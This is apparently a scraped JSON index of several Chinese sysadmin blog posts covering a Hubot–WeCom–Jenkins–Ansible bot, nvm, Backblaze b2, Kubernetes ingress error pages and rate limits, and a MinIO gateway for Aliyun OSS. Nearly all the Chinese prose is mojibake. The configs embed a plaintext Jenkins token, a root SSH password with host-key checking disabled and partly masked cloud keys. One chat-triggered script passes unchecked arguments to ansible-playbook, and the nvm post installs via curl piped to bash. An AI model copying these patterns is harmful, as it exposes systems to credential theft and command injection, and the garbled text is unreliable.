tokenï¼ˆtokenæ˜¯ç”¨æ¥ä»£æ›¿å¯†ç çš„ï¼‰ï¼Œç”¨æ¥è®¿é—® jenkins\né¦–å…ˆç™»å½• jenkinsï¼Œè®¿é—®ç½‘å€ï¼š$JENKINS_URL/me/configureï¼Œæ–°å»ºä¸€ä¸ª API Tokenï¼Œè®°å½•ä¸‹æ¥\nç”¨æ³•å¾ˆç®€å•ï¼štokenæ›¿ä»£å¯†ç ç”¨äº url è®¤è¯å³å¯ã€‚\n1cd /home/bot/myhubot 2npm install hubot-jenkins-optimised 3 4#ç¼–è¾‘external-scripts.json 5vi external-scripts.json 6[ 7 \u0026#34;hubot-diagnostics\u0026#34;, 8 \u0026#34;hubot-help\u0026#34;, 9 \u0026#34;hubot-google-images\u0026#34;, 10 \u0026#34;hubot-google-translate\u0026#34;, 11 \u0026#34;hubot-pugme\u0026#34;, 12 \u0026#34;hubot-maps\u0026#34;, 13 \u0026#34;hubot-rules\u0026#34;, 14 \u0026#34;hubot-shipit\u0026#34;, 15 \u0026#34;hubot-jenkins-optimised\u0026#34; 16] 17 18#ä¸Šé¢å¢åŠ äº†ä¸€è¡Œ 19hubot-jenkins-optimised 20 21#ç¼–è¾‘ /etc/systemd/system/hubot.service ï¼Œæ·»åŠ  jenkins çš„ç¯å¢ƒå˜é‡ 22#jenkinsçš„ç”¨æˆ·åæ˜¯peï¼Œæ‰€æœ‰authæ˜¯ \u0026#34;pe:x837491lkaflajksdf7\u0026#34; 23...... 24Environment=\u0026#34;HUBOT_JENKINS_AUTH=pe:x837491lkaflajksdf7\u0026#34; 25Environment=\u0026#34;HUBOT_JENKINS_URL=http://192.168.1.90:8080/\u0026#34; 26...... 27 28# é‡å¯ hubot 29systemctl daemon-reload 30systemctl restart hubot ç„¶åæˆ‘ä»¬ç§èŠè¿™ä¸ªæœºå™¨äººï¼Œå¯¹å®ƒè¯´: jenkins listï¼Œå°±å¯ä»¥çœ‹åˆ°é¡¹ç›®äº†ï¼Œ jenkins b 3 å°±å¯ä»¥å¼€å§‹buildç¬¬ä¸‰ä¸ªé¡¹ç›®äº†ï¼Œæ‰€æœ‰å‘½ä»¤å¯ä»¥é€šè¿‡å¯¹æœºå™¨äººè¯´ help æ¥è·å¾—\nå…­ã€é›†æˆansible é›†æˆ ansibleï¼Œå…¶å®å°±æ˜¯é›†æˆä¸€ä¸ª shellï¼Œä¹Ÿå¾ˆç®€å•\n1cd /home/bot/myhubot 2npm install hubot-script-shellcmd 3 4#ç¼–è¾‘external-scripts.json 5vi external-scripts.json 6[ 7 \u0026#34;hubot-diagnostics\u0026#34;, 8 \u0026#34;hubot-help\u0026#34;, 9 \u0026#34;hubot-google-images\u0026#34;, 10 \u0026#34;hubot-google-translate\u0026#34;, 11 \u0026#34;hubot-pugme\u0026#34;, 12 \u0026#34;hubot-maps\u0026#34;, 13 \u0026#34;hubot-rules\u0026#34;, 14 \u0026#34;hubot-shipit\u0026#34;, 15 \u0026#34;hubot-jenkins-optimised\u0026#34;, 16 \u0026#34;hubot-script-shellcmd\u0026#34; 17] 18 19#ä¸Šé¢å¢åŠ äº†ä¸€è¡Œ 20hubot-script-shellcmd 21 22#æŠŠshellcmdç›®å½•ä¸‹çš„bashç›®å½•ï¼Œå¤åˆ¶ä¸€ä»½åˆ°/home/bot/myhubot/bash 23cp -R node_modules/hubot-script-shellcmd/bash ./ 24 25#æˆ‘ä»¬æŠŠansibleçš„ymléƒ½æ”¾åˆ°/homebot/myhubot/bash/ansibleç›®å½•ä¸‹ 26cd /home/bot/myhubot/bash 27mkdir ansible 28 29#æŠŠansible-playbookçš„ymléƒ½æ”¾è¿›å» 30.... 31 32#ç„¶åç¼–å†™å‘½ä»¤è„šæœ¬ 33cd /home/bot/myhubot/bash/handles 34 35cat \u0026lt; EOF \u0026gt;\u0026gt; fuse 36#!/bin/bash 37 38if [ -n \u0026#34;$1\u0026#34; ] ; then 39 if [ -n \u0026#34;$2\u0026#34; ] ; then 40 ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=$2\u0026#34; 41 else 42 ansible-playbook /home/bot/myhubot/bash/ansible/check-disk.yml -e \u0026#34;ip=$1 fs=/\u0026#34; 43 fi 44fi 45 46exit 0 47EOF 48 49#ç»™æ‰§è¡Œæƒ 50chmod 755 /home/bot/myhubot/bash/handles/fuse 51 52#é‡å¯hubot 53systemctl restart hubot check-disk.yml çš„çœŸèº«ï¼Œæ˜¯åœ¨è¿œç¨‹æœºå™¨ä¸Šè°ƒç”¨æœ¬æœºæ‰æœ‰çš„rust dustå‘½ä»¤ï¼Œæ¥ç®—å‡ºè¿œç¨‹æœºå™¨çš„æŸä¸ªç›®å½•çš„ä½¿ç”¨æƒ…å†µ\n1--- 2- name: check machine disk space 3 hosts: \u0026#34;{{ ip }}\u0026#34; 4 gather_facts: false 5 vars: 6 - ip: \u0026#34;{{ ip }}\u0026#34; 7 - fs: \u0026#34;{{ fs }}\u0026#34; 8 - ansible_ssh_user: \u0026#34;root\u0026#34; 9 - ansible_ssh_pass: \u0026#34;Fuck2021!\u0026#34; 10 - ansible_ssh_common_args: \u0026#34;-o StrictHostKeyChecking=no -o UserKnownHostsFile=/dev/null\u0026#34; 11 - host_key_checking: False 12 tasks: 13 - name: Run a script with arguments (using \u0026#39;cmd\u0026#39; parameter) 14 ansible.builtin.script: 15 cmd: /usr/local/bin/dust -bcr {{ fs }} 16 register: output 17 18 - debug: var=output.stdout_lines æˆ‘ä»¬åœ¨ä¼ä¸šå¾®ä¿¡å¯¹æœºå™¨è¯´ shell ï¼Œå°±ä¼šå¾—åˆ°æ‰€æœ‰å‘½ä»¤åˆ—è¡¨\nå¯¹å®ƒè¯´ shell fuse 172.19.16.1 /export ï¼Œå°±ä¼šæŠŠæœ¬æœºæ‰æœ‰çš„ dust å‘½ä»¤ï¼Œæ‹·è´åˆ°172.19.16.1çš„æœºå™¨ä¸Šï¼Œå¹¶å¯¹ /export æ‰§è¡Œï¼Œå¾—åˆ°å ç£ç›˜ç©ºé—´æœ€å¤§çš„æ–‡ä»¶å’Œç›®å½•ã€‚\nå‚è€ƒèµ„æ–™ï¼š https://qydev.weixin.qq.com/wiki/index.php?title=%E5%8F%91%E9%80%81%E6%8E%A5%E5%8F%A3%E8%AF%B4%E6%98%8E http://sd.blackball.lv/library/Automation_and_Monitoring_with_Hubot_(2014).pdf ","date":"2021-12-22","img":"","permalink":"https://rendoumi.com/posts/20211222-hubot_wechat/","series":null,"tags":null,"title":"Huboté›†æˆä¼ä¸šå¾®ä¿¡+jenkins+ansible"},{"categories":null,"content":"æœ€è¿‘åœ¨æ JavaScriptsï¼Œnodejsçš„ç‰ˆæœ¬æ»¡å¤©é£ï¼Œä¹‹å‰ç”¨çš„ nvm ç®¡ç†çš„æ–¹æ³•çªç„¶ä¸èƒ½ç”¨äº†ã€‚\nè¿™é‡Œè®°å½•ä¸€ä¸‹ï¼Œæ¯”è¾ƒæ–°çš„ nvm çš„å®‰è£…ä½¿ç”¨æ–¹æ³•ï¼š\nä¸‹è½½å®‰è£…ï¼š\n1curl -o- https://raw.githubusercontent.com/nvm-sh/nvm/v0.39.0/install.sh | bash ä»¥ä¸Šçš„è„šæœ¬å®‰è£…åˆ°åº•åšäº†ä»€ä¹ˆå‘¢ï¼Ÿ\nä¸€ã€å®ƒ clone äº† nvm åˆ° $HOME/.nvmç›®å½•\näºŒã€å®ƒåœ¨ .bashrc ä¸­æ·»åŠ äº†ä¸‰è¡Œ\näº‹å®ä¸Šå®ƒæ˜¯æ ¹æ®å½“å‰çš„ bash é€‰æ‹©åœ¨ .bash_profileã€.zshrcã€.profileã€.bashrcä¸­çš„æŸä¸€ä¸ªè¿›è¡Œæ·»åŠ \nç„¶åæˆ‘ä»¬é€€å‡ºç»ˆç«¯ï¼Œå¹¶é‡æ–°è¿›å…¥ï¼Œçœ‹çœ‹\n1nvm list 2nvm ls-remote ç„¶åé€‰æ‹©æœ€æ–°çš„ç‰ˆæœ¬å®‰è£…ï¼š\n1nvm install v16.13.1 å¦‚æœæƒ³ä½¿ç”¨ä¸åŒç‰ˆæœ¬\n1nvm use 14.0.0 è®¾ç½®ç¼ºçœç‰ˆæœ¬æˆ–è€…å–æ¶ˆ\n1nvm alias defaut \u0026lt;your_nodejs_default_version\u0026gt; 2 3nvm alias default 14.0.0 4node -v # prints 14.0.0 å‚è€ƒåœ°å€ï¼šhttps://github.com/nvm-sh/nvm\n","date":"2021-12-17","img":"","permalink":"https://rendoumi.com/posts/20211217-nodejs_nvm/","series":null,"tags":null,"title":"Nodejså¤šç‰ˆæœ¬çš„å®‰è£…ä¸ç®¡ç†"},{"categories":null,"content":"S3 çš„æ¡¶å­˜å‚¨å¯ä»¥ç”¨ minio æ¥æ¨¡æ‹Ÿã€‚\nç½‘ä¸Šæœ‰ä¸ª Backblaze çš„ç½‘ç«™ï¼Œæä¾› 10GB çš„å…è´¹ç©ºé—´ï¼Œä¸”å¦‚æœæ˜¯å…¬ç½‘è®¿é—®ï¼Œ1GBæµé‡æ˜¯å…è´¹çš„ï¼Œå¦‚æœå‰é¢å¥—äº† Cloudflare çš„CDNï¼Œé‚£åŸºæœ¬æ˜¯å…¨å…äº†ã€‚\nè¯´ä¸‹ä½¿ç”¨æ–¹å¼ï¼š\né¦–å…ˆå» https://www.backblaze.com/ æ³¨å†Œä¸ªå¸å·ï¼š\nç„¶åç›´æ¥å»ºä¸ªæ¡¶ï¼ˆCreate a Bucketï¼‰\næ¡¶æ–‡ä»¶ç±»å‹é€‰æ‹© publicï¼Œå¦åˆ™æ— æ³•å…¬ç½‘è®¿é—®ï¼š\nç„¶å gen å‡º master app key æ¥å¹¶è®°å½•å¥½ï¼š\néšåæœ€å¤§çš„é—®é¢˜å°±æ¥äº†ï¼Œå¦‚æœä½ ç”¨å®ƒé¡µé¢è‡ªå¸¦çš„ä¸Šä¼ ä¸‹è½½å·¥å…·ï¼Œå½»åº•å®Œè›‹ï¼Œæ‹–è¿›å»çš„æ–‡ä»¶å¤¹ä¼šå˜æˆæ‰å¹³çš„ï¼Œå®Œå…¨ä¸§å¤±ç›®å½•ç»“æ„ã€‚\nå¿…é¡»è¦æ‰¾ä¸€ä¸ªå¥½ç”¨çš„ä¸Šä¼ å·¥å…·äº†ï¼Œæ¨è b2 ã€‚\nb2 å·¥å…·ä¸‹è½½ï¼š\nhttps://github.com/Backblaze/B2_Command_Line_Tool ä¸‹è½½åç›´æ¥æ”¹åä¸º b2 ï¼Œç„¶åæ”¾åˆ° /usr/local/bin ä¸­\n1wget -O /usr/local/bin/b2 https://github.com/Backblaze/B2_Command_Line_Tool/releases/download/v3.1.0/b2-linux 2chmod 755 /usr/lcoal/b2 è¿è¡Œä¸€ä¸‹ï¼Œæœ‰å¾ˆå¤šå‘½ä»¤å‚æ•°ï¼š\nè¯¦ç»†çš„ä½¿ç”¨æ–‡æ¡£ï¼š\nhttps://b2-command-line-tool.readthedocs.io/en/master/ å…ˆå»é…ç½®å¸å·ï¼Œè¾“å…¥applicationKeyIdå’ŒapplicationKey\n1b2 authorize-account ç„¶åå°±å¯ä»¥å¾€æ¡¶é‡Œä¼ ä¸œè¥¿äº†ï¼ŒæŠŠå½“å‰ç›®å½•ä¸‹çš„ä¸œè¥¿ä¼ åˆ° rendoumi è¿™ä¸ªæ¡¶é‡Œï¼Œå¹¶ä¸”ä¸è¦ä¼  .git ç›®å½•\n1b2 sync --excludeDirRegex .git . b2://rendoumi/ å¥— Cloudflare å°±éšæ„äº†ã€‚full sslï¼Œå»ºä¸ª CNAME ä¸”ç”¨ Page rule åš url è½¬å‘å°±å¯ä»¥äº†ã€‚\n","date":"2021-12-08","img":"","permalink":"https://rendoumi.com/posts/20211208-backblaze_usage/","series":null,"tags":null,"title":"Backblazeç±»S3å…è´¹å…å¤‡æ¡ˆå¯¹è±¡å­˜å‚¨"},{"categories":null,"content":"kubernetesä¸‹å®šåˆ¶ http 50x ä»¥åŠ 40x æœåŠ¡å™¨è¿”å›ä¿¡æ¯çš„è¯ï¼Œå¦‚æœç”¨ Nginx åš ingressï¼Œå¤§å®¶ä¼šå¾ˆè‡ªç„¶æƒ³åˆ°ç›´æ¥ç”¨ nginx æ¥å®šåˆ¶ï¼š\n1 error_page 500 502 503 504 /50x.html; 2 location = /50x.html { 3 root /export/html; 4 } è¿™æ ·åšæ˜¯ä¸è¡Œçš„ï¼Œå› ä¸º Nginx ä½œä¸º ingress æ¥ä½¿ç”¨ï¼Œå°±ä¸èƒ½è½åœ°ï¼Œåªèƒ½åšè½¬å‘ï¼›å¦‚æœä½ è½åœ°äº†ï¼Œè®¿é—®äº†æœ¬åœ°æ–‡ä»¶ï¼Œå°±è¿èƒŒäº†åˆè¡·ã€‚è€Œä¸”åœ¨ ingress çš„ pod ä¸Šæ”¾é¡µé¢ï¼Œä¼šå¯¼è‡´ ingress çš„é…ç½®é”™ä¹±ã€‚\né‚£ä¹ˆæ­£ç¡® 50x é‡å®šä½çš„æ–¹æ³•å¦‚ä¸‹ï¼šé¦–å…ˆå»ºç«‹ä¸€ä¸ª deploy å’Œå¯¹åº”çš„ svcï¼Œå°±æ˜¯å»ºç«‹ä¸€ä¸ª web æœåŠ¡å™¨ï¼Œèƒ½æä¾›æœåŠ¡è¿”å› 50x å’Œ 40x çš„å®šåˆ¶é¡µé¢ï¼›ç„¶ååœ¨ ingress\nå†…æŒ‡å®š custom-http-errors å’Œ default-backend æŒ‡å‘å®ƒå°±å¯ä»¥äº†ã€‚\nä¸€ã€å»ºç«‹miniserveçš„deployå’Œsvc æˆ‘ä»¬é€‰ç”¨ rust çš„ miniserve ä½œä¸º web æœåŠ¡å™¨ï¼Œå‡†å¤‡å¥½å®šåˆ¶å¥½çš„ index.htmlï¼Œå†™ä¸ª Dockerfile\nç½‘å€ï¼šhttps://github.com/svenstaro/miniserve\n1FROM alpine:3.12 2RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* 3 4COPY . /data/ 5 6RUN rm -rf /data/Dockerfile 7 8WORKDIR /data 9EXPOSE 8080 10 11CMD [\u0026#34;/data/miniserve\u0026#34;,\u0026#34;--index\u0026#34;,\u0026#34;index.html\u0026#34;] 12#CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; ä½œå‡ºé•œåƒåæ¨é€åˆ°é˜¿é‡Œé•œåƒï¼šregistry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest\nç„¶åå‡†å¤‡å¥½ deployå’Œ svcï¼Œéƒ¨ç½²åˆ° kubernetes é‡Œ\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: miniserve-deploy 6 labels: 7 app: miniserve 8spec: 9 replicas: 1 10 selector: 11 matchLabels: 12 app: miniserve 13 template: 14 metadata: 15 labels: 16 app: miniserve 17 spec: 18 containers: 19 - name: miniserve 20 image: registry.cn-shanghai.aliyuncs.com/rendoumi/miniserve:lastest 21 imagePullPolicy: Always 22 ports: 23 - containerPort: 8080 24--- 25apiVersion: v1 26kind: Service 27metadata: 28 name: miniserve-svc 29 labels: 30 app: miniserve 31spec: 32 ports: 33 - name: http 34 protocol: TCP 35 port: 80 36 targetPort: 8080 37 selector: 38 app: miniserve 39 type: ClusterIP äºŒã€ä¿®æ”¹ingress ä¿®æ”¹çš„åœ°æ–¹å°±æ˜¯ annotations çš„æœ€åä¸¤è¡Œï¼š\n1apiVersion: networking.k8s.io/v1beta1 2kind: Ingress 3metadata: 4 name: kala-com-ingress 5 annotations: 6 kubernetes.io/ingress.class: \u0026#34;nginx\u0026#34; 7 nginx.ingress.kubernetes.io/limit-connections: \u0026#34;2\u0026#34; 8 nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;2\u0026#34; 9 nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; 10 nginx.ingress.kubernetes.io/app-root: \u0026#34;/webui/\u0026#34; 11 nginx.ingress.kubernetes.io/auth-type: basic 12 nginx.ingress.kubernetes.io/auth-secret: kala-auth 13 nginx.ingress.kubernetes.io/auth-realm: \u0026#39;Authentication Required - Kala\u0026#39; 14 nginx.ingress.kubernetes.io/default-backend: \u0026#34;miniserve-svc\u0026#34; 15 nginx.ingress.kubernetes.io/custom-http-errors: \u0026#34;403,404,500,502,503,504\u0026#34; 16spec: 17 rules: 18 - host: kala.rendoumi.com 19 http: 20 paths: 21 - path: / 22 backend: 23 serviceName: kala-svc 24 servicePort: 80 æµ‹è¯•çš„è¯ç”¨ wrk å‹ä½ï¼Œç„¶åcurlå†æµ‹å°±503è½¬åˆ°miniserve-svc\n1wrk -c 3 -t 3 -d 10 http://kala.rendoumi.com/webui/ --latency 2 3curl -v -H \u0026#34;Host: kala.rendoumi.com\u0026#34; http://kala.rendoumi.com/webui/ ","date":"2021-11-29","img":"","permalink":"https://rendoumi.com/posts/20211129-kubernetes_custom_503/","series":null,"tags":null,"title":"Kubernetesä¸‹å®šåˆ¶æœåŠ¡å™¨503ä»¥åŠå…¶ä»–çš„403æ¶ˆæ¯"},{"categories":null,"content":"åœ¨ kubernetes ä¸­ï¼Œingress è´Ÿè´£è½¬å‘ã€èæ–­å’Œé™æµã€‚\næˆ‘ä»¬ä»¥ Nginx ingress ä¸ºä¾‹ï¼Œè®¨è®ºä¸€ä¸‹è¿™æ–¹é¢çš„é—®é¢˜ã€‚\nä¸€ã€Nginx ingressé»‘ç™½åå• è¿™ä¸ªå¾ˆç®€å•äº†ï¼Œä¸¢è¿›é»‘åå•æˆ–è€…ç™½åå•ï¼Œåœ¨å…¥å£å‰æ‹¦ä¸€åˆ€ã€‚\næˆ‘ä»¬åªè¦åœ¨ annotations å£°æ˜å³å¯ï¼š\n1apiVersion: networking.k8s.io/v1beta1 2kind: Ingress 3metadata: 4name: www-com-ingress 5annotations: 6 kubernetes.io/ingress.class: nginx 7 nginx.ingress.kubernetes.io/ssl-redirect: \u0026#34;true\u0026#34; 8 nginx.ingress.kubernetes.io/block-cidrs: a.b.c.d/32 9 #nginx.ingress.kubernetes.io/whitelist-source-range: a.b.c.d/32 10spec: 11tls: 12- hosts: 13 - www.huabbao.com 14 secretName: www-huabbao-com-cert 15rules: 16- host: www.huabbao.com 17 http: 18 paths: 19 - path: / 20 backend: 21 serviceName: nginx-svc æ³¨æ„ï¼Œå¤šä¸ªipçš„è¯ï¼Œä¹‹é—´ç”¨é€—å·éš”å¼€ï¼ˆè¯¥å€¼æ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ï¼‰ ï¼š\n1nginx.ingress.kubernetes.io/whitelist-source-range: \u0026#39;58.246.36.130,180.167.74.98,114.85.176.38â€™ äºŒã€Nginx ingressé™é€Ÿ é™é€Ÿè¿™ä¸ªé—®é¢˜æ¯”è¾ƒå¤æ‚ï¼Œé¦–å…ˆæˆ‘ä»¬éœ€è¦è€ƒè™‘åˆ°ç”¨æˆ·ä½“éªŒï¼Œå¦‚æœå¾ˆé²æ£’æ€§çš„å¼ºåˆ¶é™åˆ¶å®¢æˆ·ç«¯æµé‡æ˜¯10KBï¼Œé‚£ä¹ˆå¦‚æœä¸€å¼€å§‹çš„åŠ è½½é¡µé¢å¦‚æœè¾ƒå¤§ï¼Œå®¢æˆ·ç›´æ¥å°±ç¦»åœºäº†ã€‚æ‰€ä»¥é¦–å…ˆè¦è€ƒè™‘è¦æœ‰åˆå§‹å­—èŠ‚é‡ï¼Œè¿™ä¸ªé‡éœ€è¦èƒ½è®©å®¢æˆ·é¡ºç•…çš„æ‰“å¼€é¦–é¡µã€‚ç„¶åæˆ‘ä»¬å†è®¾å®šè¯·æ±‚é€Ÿç‡ï¼Œå†è€ƒè™‘å•ä¸ªIPåœ°å€çš„å¹¶å‘è¿æ¥é‡ï¼ˆå¹¶å‘é‡Ã—é€Ÿç‡=å®¢æˆ·ç«¯å®é™…é€Ÿç‡ï¼‰ï¼Œç¬¬å››ä¸ªå†è€ƒè™‘æ¯åˆ†é’Ÿæˆ–æ¯ç§’çš„æœ€å¤§è¯·æ±‚æ•°ã€‚\nä»¥ä¸‹æ³¨é‡Šå®šä¹‰æŒ‰é¡ºåºæ’åˆ—ï¼Œå¯ä»¥è®¾ç½®å•ä¸ªå®¢æˆ·ç«¯IPåœ°å€æ‰“å¼€çš„è¿æ¥çš„é™åˆ¶ï¼Œå¯ç”¨äºç¼“è§£DDoSæ”»å‡»ã€‚\nä¸€ã€nginx.ingress.kubernetes.io/limit-rate-afterï¼šè®¾ç½®åˆå§‹å­—èŠ‚é‡ï¼Œåœ¨æ­¤ä¹‹åï¼Œè¿›ä¸€æ­¥ä¼ è¾“å°†å—åˆ°limit-rateé€Ÿç‡é™åˆ¶ã€‚ äºŒã€nginx.ingress.kubernetes.io/limit-rateï¼šæ¯ç§’æ¥å—çš„è¯·æ±‚é€Ÿç‡ï¼ˆæ¯ç§’å­—èŠ‚æ•°ï¼‰ã€‚ ä¸‰ã€nginx.ingress.kubernetes.io/limit-connectionsï¼šæ¥è‡ªå•ä¸ªIPåœ°å€çš„å¹¶å‘è¿æ¥æ•°ã€‚ï¼ˆå¯ä»¥å»ºç«‹æœ€å¤§è¿æ¥æ•°ï¼‰ å››ã€nginx.ingress.kubernetes.io/limit-rpsï¼šæ¯ç§’å¯ä»ç»™å®šIPæ¥å—çš„è¿æ¥æ•°ã€‚ï¼ˆæ¯ä¸ªæº IP æ¯ä¸ªæº IP æ¯ç§’æœ€å¤§è¯·æ±‚æ¬¡æ•°ï¼‰ äº”ã€nginx.ingress.kubernetes.io/limit-rpmï¼šæ¯åˆ†é’Ÿå¯ä»ç»™å®šIPæ¥å—çš„è¿æ¥æ•°ã€‚ï¼ˆæ¯ä¸ªæº IP æ¯åˆ†é’Ÿæœ€å¤§è¯·æ±‚æ¬¡æ•°ï¼‰ å¯ä»¥æŒ‡å®š nginx.ingress.kubernetes.io/limit-whitelist è®¾ç½®ä»é€Ÿç‡é™åˆ¶ä¸­æ’é™¤çš„å®¢æˆ·ç«¯IPæºèŒƒå›´ï¼Œè¯¥å€¼ä¹Ÿæ˜¯é€—å·åˆ†éš”çš„CIDRåˆ—è¡¨ã€‚\nå¦‚æœåœ¨å•ä¸ªIngressè§„åˆ™ä¸­è®¾ç½®äº†å¤šä¸ªæ³¨é‡Š limit-rpmï¼Œåˆ™ limit-rps ä¼˜å…ˆã€‚\n1apiVersion: extensions/v1beta1 2kind: Ingress 3metadata: 4 name: my-ingress 5 annotations: 6 nginx.ingress.kubernetes.io/limit-rate-after: 500k 7 nginx.ingress.kubernetes.io/limit-rate: 50k 8 nginx.ingress.kubernetes.io/limit-connections: \u0026#34;3\u0026#34; 9 nginx.ingress.kubernetes.io/limit-rps: \u0026#34;1\u0026#34; 10 nginx.ingress.kubernetes.io/limit-rpm: \u0026#34;3\u0026#34; 11 nginx.ingress.kubernetes.io/limit-whitelist: \u0026#34;192.168.7.0/24\u0026#34; 12spec: 13 rules: 14 - host: my.test.com 15 http: 16 paths: 17 - path: / 18 backend: 19 serviceName: nginx 20 servicePort: 80 è§£é‡Šä¸€ä¸‹ï¼š\né¦–å…ˆè®¾ç½®äº†åˆå§‹å­—èŠ‚é‡æ˜¯500k\nç„¶ååˆå§‹å­—èŠ‚é‡ç”¨å®Œä¹‹åï¼Œé™åˆ¶ç”¨æˆ·ä¼ è¾“é€Ÿç‡æ˜¯50k/s\néšåå¹¶å‘è¿æ¥è®¾ç½®ä¸º3ï¼Œé‚£ä¹ˆå®¢æˆ·ç«¯å¦‚æœåŒæ—¶æ‰“å¼€3ä¸ªè¿æ¥ï¼Œæ€»é€Ÿç‡æ˜¯ 50kÃ—3=150k/s\nç¬¬å››æ­¥è¿›ä¸€æ­¥è®¾ç½®äº†æ¯ç§’æœ€å¤§è¯·æ±‚æ¬¡æ•°æ˜¯1ï¼Œä¸‹é¢åˆè®¾ç½®æ¯åˆ†é’Ÿæœ€å¤§è¯·æ±‚æ¬¡æ•°æ˜¯3ã€‚\nç¬¬äº”æ­¥è®¾ç½®äº† 192.168.7.0/24 è¿™æ®µä¸å—é™é€Ÿçš„å½±å“\nè®¾ç½®å¥½ä»¥åå‹æµ‹è¯•ä¸€ä¸‹ï¼š\nè¶…é™è¿”å›çš„ä»£ç æ˜¯503\n1wrk -c 3 -t 3 -d 10 http://m.test.com --latency 2 3 4curl -v -H \u0026#34;Host: m.test.com\u0026#34; http://m.test.com 5\u0026lt; HTTP/1.1 503 Service Temporarily Unavailable 6\u0026lt; Date: Wed, 28 Jul 2021 04:32:03 GMT 7\u0026lt; Content-Type: text/html 8\u0026lt; Content-Length: 190 9\u0026lt; Connection: keep-alive 10HTTP/1.1 503 Service Temporarily Unavailable ","date":"2021-11-29","img":"","permalink":"https://rendoumi.com/posts/20211129-kubernetes_nginx_ingress_limit/","series":null,"tags":null,"title":"Kubernetesä¸‹nginx Ingressçš„é™åˆ¶"},{"categories":null,"content":"é˜¿é‡Œçš„äº‘çš„ OSS å¹¶ä¸æ˜¯å®Œå…¨ç‰ˆæœ¬çš„ AWS S3 å…¼å®¹ã€‚\næˆ‘ä»¬å¦‚æœéœ€è¦ç”¨ S3 åè®®è®¿é—® OSSï¼Œå°±æ¯”è¾ƒéº»çƒ¦äº†ã€‚\næ‰€ä»¥æ­å»ºä¸€ä¸ª minio æ¥åšç½‘å…³ï¼Œä»£ç†OSSï¼Œminio æ˜¯åŸºæœ¬å…¼å®¹S3çš„ï¼Œæ‰€ä»¥è¿™æ ·æ›²çº¿æ•‘å›½ï¼Œé€šè¿‡ S3 åè®®è®¿é—® minio æ¥è®¿é—®æœ€åç«¯çš„ OSS\nè¿™é‡Œè¿˜æœ‰ä¸€æ®µæ•…äº‹ï¼š\nMinio ä¸­é—´æœ‰ä¸€ç‰ˆæ˜¯æ”¯æŒ oss çš„ï¼Œä½†æ˜¯åæ¥ oss æ”¹äº†åè®®ï¼Œæ‰€ä»¥ç°åœ¨çš„æœ€æ–°ç‰ˆæœ¬ minio åè€Œæ˜¯ä¸æ”¯æŒä»£ç† oss çš„ï¼Œæˆ‘ä»¬å¿…é¡»æ‰‹åŠ¨ä½œå‡ºé•œåƒï¼Œæ”¾åˆ°é•œåƒåº“é‡Œï¼Œç„¶åé˜¿é‡Œ ACK å†ä½¿ç”¨\né¦–å…ˆå»ä¸‹è½½é‚£ä¸€ç‰ˆç›´æ¥æ”¯æŒossçš„\n1wget http://dl.minio.org.cn/server/minio/release/linux-amd64/archive/minio.RELEASE.2020-04-15T19-42-18Z 2 3chmod 755 minio.RELEASE.2020-04-15T19-42-18Z è¿™ä¸ªæ–‡ä»¶æ¯”è¾ƒå®è´µï¼Œç»™ä¸ªæœ¬åœ°å¤‡ä»½é“¾æ¥ä¸‹è½½ï¼š\nminio.RELEASE.2020-04-15T19-42-18Z ç„¶ååœ¨å½“å‰ç›®å½•ç¼–è¾‘ Dockerfile ï¼Œå› ä¸º K8S å’Œ OSS åŒä¸€åœ°åŸŸï¼Œæ‰€ä»¥ç”¨ OSS ç§ç½‘åŸŸåï¼š\n1FROM alpine:3.12 2 3RUN apk add --update bash \u0026amp;\u0026amp; rm -rf /var/cache/apk/* 4 5COPY minio.RELEASE.2020-04-15T19-42-18Z /data/minio.RELEASE.2020-04-15T19-42-18Z 6 7ENV MINIO_ACCESS_KEY=LTAI5tFFTbsxxxxxuLb 8ENV MINIO_SECRET_KEY=t78PyGnHZilxxxxxdxBCjvNgtVC5Y 9 10WORKDIR /data 11EXPOSE 9000 12 13CMD [\u0026#34;/data/minio.RELEASE.2020-04-15T19-42-18Z\u0026#34;,\u0026#34;gateway\u0026#34;,\u0026#34;oss\u0026#34;,\u0026#34;http://oss-cn-shanghai-internal.aliyuncs.com\u0026#34;] 14# CMD /bin/sh -c \u0026#34;while true; do echo hi; sleep 10; done\u0026#34; æ³¨æ„ä¸Šé¢ï¼ŒMINIO_ACCESS_KEY å’Œ MINIO_SECRET_KEY å¯¹åº”çš„æ˜¯é˜¿é‡Œäº‘ OSSçš„ AccessKey ID å’Œ AccessKey Secret\næ‰“å¼€é˜¿é‡Œäº‘ç½‘å€ï¼Œæ–°å»ºAccessKey ID å’Œ AccessKey Secret ï¼Œæ³¨æ„è¿™ä¸œè¥¿åªèƒ½çœ‹è§ä¸€æ¬¡ï¼Œä¹‹åå†ä¹Ÿä¸èƒ½æ˜æ–‡çœ‹äº†ï¼Œæ‰€ä»¥ç¬¬ä¸€æ¬¡åŠ¡å¿…ä¿å­˜å¥½ï¼ï¼ï¼\nhttps://ram.console.aliyun.com/manage/ak ç„¶åè¿˜æœ‰ Dockerfile çš„æœ€åä¸€è¡Œï¼Œå…«æˆ’çš„ä¹ æƒ¯æ˜¯ä¿ç•™ä¸€ä¸ªæ­»å¾ªç¯ shellï¼Œå¦‚æœé•œåƒ CMD æœ‰é—®é¢˜ï¼Œæ— æ³•å¯åŠ¨ï¼Œå°±æ¢æˆè¿™ä¸ªå…ˆå¯åŠ¨ï¼Œç„¶åå†è¿›å»è°ƒè¯•ã€‚ï¼ˆç»å¸¸æœ‰ä»€ä¹ˆåº“é”™ã€é“¾æ¥æä¸å¥½éœ€è¦ä¿®æ”¹ï¼‰\ndocker build -t registry.cn-shanghai.aliyuncs.com/rendoumi/minio . ç„¶å push ä¸Šå»\ndocker push registry.cn-shanghai.aliyuncs.com/rendoumi/minio ç¼–å†™å¥½Deploymentå’Œsvcï¼Œå¦‚æœæƒ³å…¬å¼€è¿˜å¯ä»¥å†™ ingress å‘å¤–æš´éœ²ï¼Œè‡ªå·±å…¬å¸ç”¨è¿˜æ˜¯ port-forward æ›´å®‰å…¨\n1--- 2apiVersion: apps/v1 3kind: Deployment 4metadata: 5 name: minio-deploy 6 